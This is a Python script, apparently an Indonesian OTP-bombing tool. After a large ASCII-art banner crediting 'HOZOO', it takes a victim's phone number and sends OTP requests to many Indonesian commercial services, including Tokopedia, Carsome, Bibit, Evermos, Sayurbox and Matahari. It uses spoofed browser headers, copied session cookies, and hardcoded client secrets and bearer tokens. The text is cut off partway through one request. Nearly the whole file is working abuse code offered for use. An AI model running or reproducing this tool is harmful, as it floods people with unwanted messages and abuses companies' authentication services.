#python KANDURA2.py
#Author
try:
	import os,sys,time,requests,bs4,json,re,datetime,random,string
	from datetime import datetime
	from bs4 import BeautifulSoup
	from colorama import Fore,init,Back
except ModuleNotFoundError:
	print ("  ! Menginstall Module Otomatis")
	os.system("pip install requests bs4 datetime random colorama")
	print ("  + Module Telah Terinstall | Mengulang Tools")
	time.sleep(2)
	os.system("python KANDURA2.py")
except KeyboardInterrupt:
	sys.exit("  ! Tools Dihentikan                               ")


def clear(): # Untuk Clear Terminal
	os.system("clear")

# Ganti Logo atau Nama mu terserah
def banner():
	print ("""
	WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKMMMMMMMMNXNWMMMWNKOxxxkOO0NWWMWWNNNMWKO0KXNWMMMW0OWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXWMMMMWNNNNNNN0OxddxxdddkOOOKNNWWNXXNNWMMWMMMMWNXkXWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXMMNNNNNNNNXKkOOOOOOOOOkkkkkKWNK0kO0KXNWMMMMWNXK0WWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKNNNKXWWXXNKkOOOOOO0OkkkxxxxkNWMXkkkOO0XNWMMWNXKKWWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWNK0OKWKxxkNXNN0OOkkkkkOO0xkkkkxd0WWWM0xdkkO0KXNMMWNKkNWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWNXXKK0NNOxxxxkWWKXNKkkkkkkO0kkkxxxxkNWMMWkxdxkO00NNMMWXox0NWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWXXWWWNX0NkxxxxxONXXXMW0OkkkOO0Okkkkx0XK0XNOxxxxxxk00NXMM0dkkkKWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWKMMMWW0WOkkkkxxkOXKNMMMNXKNW00OOOXNNNMWNxkxxxxxxxkk0KXNNdkkkOOKWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWXMMMKNXkkkkkkkxkOOKWMMMMWMWNKk0OWMMMXXKxxxxxxkxxxkk000ddkkO0XW0WWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWXWMOW0OOOOkkxk0O0kOWMMMMMMNNkk00WMNOkkxxxxxxkkxxkkk0xdkOO0NWWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWNOXXK0OOOOOxO0xKkOKWWWWNWNWOkkKKKOkkkkxdkkkkkxkxkkOdoOOKNWMKNWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWkNNX000OOdOKkdKkOOOOO0OKXWKOxkKOOOOkkkdxkkkkxkxOkkdokXWWMKNWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWkNNX0XK0xdKk0O0xkOOOOOOdxXXONxkK0000OkxxOOOOkkkkOxdo0MMMXNWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWkMNKXXKOok0KWWOOokO0000xl0XOWNxdKKKKKddx0000OkOkOxdo0MMNXWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWNNMNKNN0dd00WMMKKdxO0KKKOldK00K0koOXXXxodK0000k0k0ddo0MNXWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWKMMNKXXOldxKKKKKOOk0O0XXXxckXXWMMKdd0XkooK0000k0kkddd0NKWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWW0MMNKXXkcdXWMMMMW0kOWK0XNXodOXWMWWW0dkOxlK0O00k0kdddo0dNWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWW0NMNKXXxl0WMWWWWWWXOXMWKKXXkOk000OOO0xddoK0O0OOOddxxlox0WWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWKKMWKXXkxWW0xdkk00XWXXWMMNNN0Kxkl,''...':dOO0k0Ox00K0ddxWWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWK0WW0XX0do,';.;o:cOWMMWWMMMWN0dlc:'ok'.cl.,xxx0x0OOONxooNWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWXKKWKXX0:,dOd,,:;.:WMMMMMMMMMWXNc,.,,.'ok,lxOOOkOO0XKxod0WWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWN0WKXKXXkoXWXc;:d;:NMMMMMMMMMMMWKlkKKd:kkxxO0OOk0OX0dxodxWWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWNXNXXXXKOKNNxoOXKXWWWMMMMMMMMWWWK0KXKKOKkx000OkK0xxdxodkXWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWXWNXNXX0KNNNNNWWWWWWMMMMMMMMWWWWNNNNOXNkkK00xxxxxxdxdxXXWWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWNWXNXKO0NNNNWWWWWWMMMNWMMMMWWWWWWWXXNWkKKO0dxxxxxdxxOXXNWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKXNXkx0WWWWWWWWWMMMWMMMMMWWWWWWNNWWN00k00oxxxxxdxO0KWKWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKKNN0od0NWWWWWMMMWWMMMMMWWWWWWWWWWNKOx0NxoxxxxxdkKOKWKWWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXXKWNOkk0KWMMMMMWWWWWWWWWNWMMMWWXXOdkKN0doxxxxxd0KO0WXNWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWKKXWNOWKKKNWWMMMMMMMMMMMMMMWWNNKKxkXNX0odxxxxxxKKO0XWKWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNKXXWNKWWXKXXWMMMMMMMMMMMMWNXK0k00XXNKkddxxxxxOKK0OXWKWWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNKXKNXXWWWWNKK00NWMMMMWXK0O000kXXNWXO0dxxxxxxKKK0OXWXNWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNNXKKXWWWWWWNxxkO00OkO0000OO0WWWN0NkdxxxxOkKKK0OWXWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWXK0XWWWWXk000000000OOOO0kWWNNWXxxxxxOOkKKK0OWXWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNX0ONXKKNWk000000000000000xKWWWWOxxxxOOO0KKKO0WXWKWWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWWNkollcccl:;,kXNNXOk00000000000000KXXNXXNWxxxkOOO0XKKKOKWXWXNWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWWWWWWk'''''',,::;'XWMMWNNXKK0000000KKXNWMMWWWNKOkxdlokOOK0KOKWKNNXWWWWWWWWWWWWW
NWXWWWWWWWWWWWWWWWWWWWWWWWd..''';;;;;:;,OXWMMMMMMWWWWWWWWWMMMMMMMWWMMWW0;,;:;,;;;;clxXXXWWWWWWWWWWWWW
WWXWWWWWWWWWWWWWWWWWWWWWWd'.'';;;:::::::xWNWWMMMMMMMMMMMMMMMMMMMMMWWWXd:::;;;::::::;,:KNWWWWWWWWWWWWW
WXWWWWWWWWWWWWWWWWWWWWWWx''.,;:;,,;:;;:::XMWWNNWMMMMMMMWNNNNNNNXXXKOl:::;;:;;;;::::,,.:NWWWWWWWWWWWWW
KWWWWWWWWWWWWWWWWWWWWWWO''..';;'',;::;;::cKMMMXNWMMMWNKXWMMMMMWWXOo::;;;::;;,,,;;;;,'.'OWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWWK'''..,;'',;::::;;;::dNWWKXMMMMWWWMMMWKOdl::;;:::;;;;,',,;;;;,'''lWWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWN,'''..;',;::::::::;;:::dXMWMMMMWX0kdl::;;:;;;::::;,,,'';;;;,,','',WWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWWc''''''';::ldc::::;;,,;;;;lddolc:::;;;;;;;;;::::::;;','.;:;,,,,;,''WWWWWWWWWWWWW
WWWWWWWWWWWWWWWWWWWWx'''',,;:::OMMo:::;;;;,,'''':;,,,,''''',,,,;;:::::::;,''.;;,','::,'.XWWWWWWWWWWWW
WNNNNNWWWWWWWWWWWWWo'''',;::::KMMO;::;;;,''''.'dxo.'''',,;;;;;:::;::;;::;;''..'''';::,'.xWWWWWWWWWWWW
WMMWNNXWWWWWWWWWWNc.'',::::::ONMN:::::::::;;;,0NNk;;;;:::::::::xKWMWWNK0ko,...''',:::;'.;WWWWWWWWWWWW
NXNNWWWWWWWWWWWWN:.'.,::::::dXKXl:::;;:::::::dNWMc::::::::::;d0occccodk0XNXo..''';:::;'.'OWWWWWWWWWWW
NWWWWWWWWWWWWWWX;''.';:::::lWMMNkkkxdooooooldXNXO;;;;;:::::;kk::::::::;::;:;...';::::;'.':WWWWWWWWWWW
WWWWWWWWWWWWWWN;''..,::::;;0MMWXXXWWNNNXKXWWWNNX;;;;;::::::ck;::::::::::::::,..';:::::,'''KWWWWWWWWWW
KXXXXXXXXXXXXKl......,;;,,,KX0OKKOXXXKK0xldkOOOd',,,,,,,,,;c,;,,,,,,,,,,,,,,'...',,,;,'...lXXXXXXXXXX
██╗░░██╗░█████╗░███████╗░█████╗░░█████╗░
██║░░██║██╔══██╗╚════██║██╔══██╗██╔══██╗  
███████║██║░░██║░░███╔═╝██║░░██║██║░░██║ 
██╔══██║██║░░██║██╔══╝░░██║░░██║██║░░██║
██║░░██║╚█████╔╝███████╗╚█████╔╝╚█████╔╝
╚═╝░░╚═╝░╚════╝░╚══════╝░╚════╝░░╚════╝░
+=============UU====UU================== >
+ SC UPDATE:22-10-2023                   >
+ coded by : HOZOO|                      >
+ Team     : INDONESIAN REVOLUTION CYBER >
+ TIKTOK   :HACKERSHOZOORAFI             >
+======================================= >
""")
# Don't Remake (Jangan Di edit)
def main():
	try:
		clear()
		banner()
		nomor = input(" └──[+] Input Nomor (8xxx): ")
		tokoko=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={'Host':'api-v2.bukuwarung.com','content-length':'198','sec-ch-ua':'"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','x-app-version-code':'5050','x-app-version-name':'android','buku-origin':'tokoko','sec-ch-ua-platform':'"Linux"','origin':'https://web.tokoko.id','sec-fetch-site':'cross-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://web.tokoko.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
		site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text # tokped
		search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1) # tokped
		sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',}).text # send requests tokped
		kukis={'cookie':'ajs_anonymous_id=5a3e8670-63ce-4348-8dca-641748d7d767','cookie':'_ALGOLIA=anonymous-2b34b4e4-c817-499f-a0d4-5930ffbaf7ff','cookie':'_fbp=fb.1.1662046677088.183334261','cookie':'g_state={"i_p":1662053880779,"i_l":1}','cookie':'_hjSessionUser_1895264=eyJpZCI6IjBkNWYwMjNjLWNjMGEtNTVmNi1hYTNkLTgwZmJjYTU5N2RhNiIsImNyZWF0ZWQiOjE2NjIwNDY2NzY2NTgsImV4aXN0aW5nIjp0cnVlfQ==','cookie':'amp_7c6549=BuD_ETdrbio9LDUB2TB6V-...1gc3r9m4s.1gc3r9m4s.0.0.0','cookie':'_clck=1nxlj0s|1|f4l|0','cookie':'tml_t=ab85e71e-ddd0-4317-a14b-1e5a6c202a43','cookie':'amp_4b05bb=jrGWubrrFNjGvlqLBgVTH_...1glb1ck7f.1glb1ck7f.0.0.0','cookie':'__cf_bm=Ee0IbDXhZjy2AiRtIyyK7OhmiIN9OawLBwVyRHC3DLQ-1672186583-0-AdaNbL4+xeIXNO1UbfZ1feHhHZCjnQlkjgARFkyoFJQ117Za5erTm4q2gKEuogBEtNqcxWbNCX/EoBa9wp7auxY=','cookie':'_gcl_aw=GCL.1672186586.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gcl_au=1.1.2101568662.1672186586','cookie':'utm={"utm_source":"Google","utm_medium":"Search","utm_campaign":"EN_AlwaysOn_PureBrand_Exact_Brand_","utm_term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'ucif={"src":"Google","med":"Search","camp":"EN_AlwaysOn_PureBrand_Exact_Brand_","cont":"carsome","term":"Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_"}','cookie':'attribution=Google','cookie':'_hjIncludedInSessionSample=0','cookie':'_hjSession_1895264=eyJpZCI6ImE0YTAzNmVkLTBiNzctNGYzOC1hNWZiLTUzODEyM2RlNjU0NCIsImNyZWF0ZWQiOjE2NzIxODY1ODkxMDcsImluU2FtcGxlIjpmYWxzZX0=','cookie':'_hjAbsoluteSessionInProgress=1','cookie':'moe_uuid=30b62d3f-6f5c-46a2-b324-79bb5fdde264','cookie':'_gid=GA1.2.1272855920.1672186591','cookie':'_gac_UA-70043720-4=1.1672186591.CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','cookie':'_gat_UA-70043720-4=1','cookie':'_ga=GA1.1.651678291.1662046676','cookie':'_ga_L3ZY5XJB08=GS1.1.1672186591.5.0.1672186592.59.0.0','cookie':'tml_s=3ba17acd-ecae-4716-b725-d4176b4c88a1',
	'cookie':'_uetsid=e3fb7eb0864411eda3df3b3860185a56','cookie':'_uetvid=0f040fa02a0c11ed8727e1811f9a3cb3'} # kukis carsome
		carsome=requests.post("https://www.carsome.id/website/login/sendSMS",headers={'Host':'www.carsome.id','content-length':'38','sec-ch-ua':'"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','x-language':'id','sec-ch-ua-mobile':'?1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','country':'ID','x-amplitude-device-id':'jrGWubrrFNjGvlqLBgVTH_','sec-ch-ua-platform':'"Android"','origin':'https://www.carsome.id','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://www.carsome.id/jual-mobil-bekas?utm_source=Google&utm_medium=Search&utm_campaign=EN_AlwaysOn_PureBrand_Exact_Brand_&utm_term=Search_Brand_AlwaysOn_ID_Perf_Conv_Exact_&utm_content=carsome&gclid=CjwKCAiAzKqdBhAnEiwAePEjkrqvarLq5rUGq68mzu3YvhN3ogS8YsteLaFY6VNeJnWgVNc8Ssa8URoClEQQAvD_BwE','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},cookies=kukis,data=json.dumps({"username":nomor,"optType":1})).text
		bibit=requests.post("https://api.bibit.id/auth/register/phone",headers={'Host':'api.bibit.id','accept':'application/json, text/plain, */*','content-type':'application/json','sec-ch-ua-mobile':'?1','x-platform':'web','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://app.bibit.id','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://app.bibit.id/','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=json.dumps({"code":"62","phone":nomor,"via":"whatsapp","recaptcha_token":"","recaptcha_type":"v3"})).text
		cook={"cookie":"_gcl_au=1.1.909457086.1662115605","cookie":"__gtm_campaign_url=https%3A%2F%2Fevermos.com%2Freg%2Fsitelink_daftar%2F%3Fgclid%3DCj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"__gtm_referrer=https%3A%2F%2Fwww.google.com%2F","cookie":"_gid=GA1.2.1927488580.1662115605","cookie":"_gac_UA-127603098-29=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gac_UA-127603098-27=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gcl_aw=GCL.1662115606.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_fbp=fb.1.1662115607118.1815022728","cookie":"_ga_E48JMVJVEG=GS1.1.1662115603.1.0.1662115609.0.0.0","cookie":"poptin_old_user=true","cookie":"poptin_user_id=0.42qy01qhmjj","cookie":"evm_client_token=fd0c103b778b2da4bf5cd3520ff64a500f3f1137","cookie":"evm_version=2.48.14","cookie":"utm_tracker=%7B%22source_link%22%3A%22versionb.ea7%22%7D","cookie":"_ga=GA1.2.56596919.1662115604","cookie":"_gat_gtag_UA_127603098_1=1","cookie":"_gat_UA-127603098-1=1","cookie":"_ga_8NN2ZT44WP=GS1.1.1662115616.1.0.1662115619.0.0.0","cookie":"rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19cj2GvLExMO7pRcRLevWUUYg9hSlCCKEbtmQAzju4RWUWo22yC%2B3dUMBswi22yZpDc2jU3DHURNmVnOfZLpfGzkMpatP9yCh0%3D","cookie":"rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18v21NYtvQDe7sPj6DM6%2BqN8HCmUTTSGrA%3D","cookie":"_gat=1","cookie":"MgidSensorNVis=2","cookie":"MgidSensorHref=https://evermos.com/registration?source_link=versionb.ea7","cookie":"_gat_%5Bobject%20Object%5D=1","cookie":"afUserId=154dedac-a679-4204-8121-fbd290672de8-p","cookie":"AF_SYNC=1662115627689","cookie":"registered_user=%7B%22verificationToken%22%3Anull%2C%22phone%22%3A%2262"+nomor+"%22%2C%22password%22%3A%22jsjwjwhebe%22%2C%22name%22%3A%22Zgsghshsbs%22%2C%22subDistrictId%22%3A%223175%22%2C%22referral%22%3Anull%7D",
	"cookie":"otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D","cookie":"rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D","cookie":"amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6"}
		Arifa=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","content-length":"25","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor}),cookies=cook).text
		ruparupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
		js=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
		ken=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'289','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.212.88","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc2NTc0LCJleHAiOjE2NjQ5Njg1NzQsImlhdCI6MTY2MjM3NjU3NCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.hbvAGWui1gSK26sEzhC9l790_JVobzkR3j82ZPi1hIwflbf-f08WTRbTraE7_6U_Q60QetC0Xk-GR3JndHodWuXvMbi0yIum8ghQ2fGG4ZR5F9RdPWOv0k1v10NyxOxUuWdfVUK_wMqoYZGK4klL2B3InPd-WMra4MhX9JoW91LBtpLx-tm5GLzPytX5hHINiqs6hZnvypbIBGqQr5oQp_ruJNezAfUBtYVmHdUahlJs1j9aD8IDF-86NVGGEfLjOMERi1cet4mf8uJmKn9ScIP18XMQVAdoxJnkVTwPQBOvQsP2EOMyh___hYvpjwe2T4qriGD1lpMgP2cHuf-dxw','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=js).text
		possing = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}})).text
		segar=requests.post("https://api-v2.segari.id//v1/otps/generate",headers={"Host":"api-v2.segari.id","content-length":"30","accept":"application/json, text/plain, */*","x-segari-platform":"web","origin":"https://segari.id","user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36","content-type":"application/json;charset=UTF-8","referer":"https://segari.id/login","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phoneNumber":nomor})).text
		al=requests.get("https://www.toyskingdom.co.id/membership/send-otp?cellphone="+nomor+"&otp_type=register&email=tololbet615%40gmail.com",headers={'Host':'www.toyskingdom.co.id','Connection':'keep-alive','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','Accept':'*/*','X-Requested-With':'XMLHttpRequest','sec-ch-ua-mobile':'?1','User-Agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','Sec-Fetch-Site':'same-origin','Sec-Fetch-Mode':'cors','Sec-Fetch-Dest':'empty','Referer':'https://www.toyskingdom.co.id/membership/register/+aqXlp409RHHXTQyyGCurg==/zb3+iKnqYXQ86its61Z4Jg==','Accept-Encoding':'gzip, deflate, br','Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}).text
		ses=requests.post("https://api.pintarnya.com/api/pk/auth/register/mobile",headers={'Host':'api.pintarnya.com','content-length':'27','sec-ch-ua':'"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"','sec-ch-ua-mobile':'?1','authorization':'Bearer undefined','user-agent':'Mozilla/5.0 (Linux; Android 12; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36','content-type':'application/json','accept':'application/json, text/plain, */*','platform':'web-kerja','sec-ch-ua-platform':'"Android"','origin':'https://pintarnya.com','sec-fetch-site':'same-site','sec-fetch-mode':'cors','sec-fetch-dest':'empty','referer':'https://pintarnya.com/','accept-encoding':'gzip, deflate, 